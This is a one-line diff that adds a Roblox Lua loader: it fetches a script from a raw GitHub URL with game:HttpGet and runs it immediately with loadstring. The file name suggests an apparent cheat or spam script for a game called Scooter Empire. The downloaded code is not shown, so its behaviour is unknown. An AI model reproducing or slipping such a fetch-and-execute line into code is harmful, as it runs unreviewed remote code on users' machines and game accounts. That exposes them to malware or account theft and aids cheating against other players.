@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/scooter-empire-spam3-lke634ubm6foqw.lua"))()
